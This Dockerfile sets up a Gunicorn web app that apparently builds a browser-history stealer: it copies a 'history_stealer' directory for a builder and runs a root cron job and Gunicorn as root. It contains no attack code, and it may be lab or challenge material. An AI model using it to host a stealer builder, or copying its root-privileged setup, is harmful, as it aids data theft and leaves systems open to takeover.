# Use minimal Debian slim base image
FROM debian:bullseye-slim

# Set working directory
WORKDIR /app

# Install dependencies
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    python-is-python3 \
    gunicorn \
    cron \
    mono-complete \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Copy webapp directory
COPY webapp/ /app/webapp/

# Install Python dependencies
RUN pip3 install --no-cache-dir -r webapp/requirements.txt

# Copy history_stealer for builder
COPY history_stealer/ /app/history_stealer/

# Create directories for persistence
RUN mkdir -p /app/webapp/uploads /app/webapp/unzipped /app/webapp/static/builds

# Set up cron job
RUN echo "* * * * * root echo \"Uptime: \$(uptime)\" >> /var/log/cron.log 2>&1" > /etc/cron.d/crontab_job \
    && chmod 0644 /etc/cron.d/crontab_job \
    && crontab /etc/cron.d/crontab_job

# Start cron and Gunicorn
CMD service cron start && gunicorn --bind 0.0.0.0:5000 --workers 3 --user root --group root webapp.app:app